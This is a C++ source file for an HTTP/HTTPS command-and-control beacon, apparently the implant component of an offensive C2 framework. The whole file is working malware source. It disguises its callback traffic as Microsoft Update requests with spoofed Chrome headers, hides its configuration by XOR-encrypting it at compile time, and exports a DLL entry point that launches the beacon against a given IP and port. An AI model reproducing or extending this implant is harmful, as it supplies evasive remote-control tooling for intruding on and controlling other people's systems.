#include "BeaconHttp.hpp"


using namespace std;


// XOR encrypted at compile time, so don't appear in string
// size of the config contained between () must be set in the compileTimeXOR template function
constexpr std::string_view _BeaconHttpConfig_ = R"({
    "ListenerHttpConfig": [
        {
            "uri": [
                "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
                "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
                "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
            ],
            "client": [
                {
                    "headers": [
                        {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
                        },
                        {
                            "Connection": "Keep-Alive"
                        },
                        {
                            "Content-Type": "text/plain;charset=UTF-8"
                        },
                        {
                            "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
                        },
                        {
                            "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="
                        },
                        {
                            "Keep-Alive": "timeout=5, max=1000"
                        },
                        {
                            "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"
                        },
                        {
                            "Accept": "*/*"
                        },
                        {
                            "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""
                        },
                        {
                            "Sec-Ch-Ua-Platform": "Windows"
                        }
                    ]
                }
            ]
        }
    ],
    "ListenerHttpsConfig": [
        {
            "uri": [
                "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
                "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
                "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
            ],
            "client": [
                {
                    "headers": [
                        {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
                        },
                        {
                            "Connection": "Keep-Alive"
                        },
                        {
                            "Content-Type": "text/plain;charset=UTF-8"
                        },
                        {
                            "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
                        },
                        {
                            "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ=="
                        },
                        {
                            "Keep-Alive": "timeout=5, max=1000"
                        },
                        {
                            "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1"
                        },
                        {
                            "Accept": "*/*"
                        },
                        {
                            "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""
                        },
                        {
                            "Sec-Ch-Ua-Platform": "Windows"
                        }
                    ]
                }
            ]
        }
    ]
})";

constexpr std::string_view keyConfig = ".CRT$XCL";

// compile time encryption of http configuration
constexpr std::array<char, 3564> _EncryptedBeaconHttpConfig_ = compileTimeXOR<3564, 8>(_BeaconHttpConfig_, keyConfig);


int main(int argc, char* argv[])
{	
	std::string ip = "...";
	if(argc > 1)
		ip = argv[1];

	int port = 8443;
	if (argc > 2)
		port = atoi(argv[2]);

	bool https = false;
	if (argc > 3)
	{
		std::string sHttps = argv[3];
		if(sHttps=="https")
			https=true;
		else if(sHttps=="http")
			https=false;
	}

	// decrypt HttpConfig
    std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
    std::string key(keyConfig);
    XOR(configDecrypt, key);

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconHttp>(configDecrypt, ip, port, https);

	beacon->run();
}


#ifdef __linux__
#elif _WIN32

extern "C" __declspec(dllexport) int go(PCHAR argv)
{
    // OutputDebugStringA("HelperFunc was executed");
    // OutputDebugStringA(argv);

    std::vector<std::string> splitedCmd;
    std::string delimiter = " ";
    splitList(argv, delimiter, splitedCmd);

    // OutputDebugStringA(splitedCmd[0].c_str());
    // OutputDebugStringA(splitedCmd[1].c_str());
    // OutputDebugStringA(splitedCmd[2].c_str());

    if (splitedCmd.size() == 3)
    {
        std::string ip = splitedCmd[0];
        int port = -1;
        try
        {
            port = stoi(splitedCmd[1]);
        }
        catch (...)
        {
            return 1;
        }

        bool https = true;
		std::string sHttps = splitedCmd[2];
		if(sHttps=="https")
			https=true;

        // decrypt HttpConfig
		std::string configDecrypt(std::begin(_EncryptedBeaconHttpConfig_), std::end(_EncryptedBeaconHttpConfig_));
		std::string key(keyConfig);
		XOR(configDecrypt, key);

		std::unique_ptr<Beacon> beacon;
		beacon = make_unique<BeaconHttp>(configDecrypt, ip, port, https);

		beacon->run();
	}

    return 0;
}

#endif